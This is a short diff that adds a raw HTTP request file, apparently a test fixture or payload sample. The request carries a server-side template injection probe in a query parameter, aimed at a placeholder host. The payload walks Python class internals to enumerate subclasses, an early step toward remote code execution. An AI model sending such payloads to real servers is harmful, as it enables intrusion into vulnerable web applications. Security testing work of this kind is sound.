@@ -1,0 +1,4 @@
+GET /a?file={{\u0027\u0027.__class__.__mro__[2].__subclasses__()}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
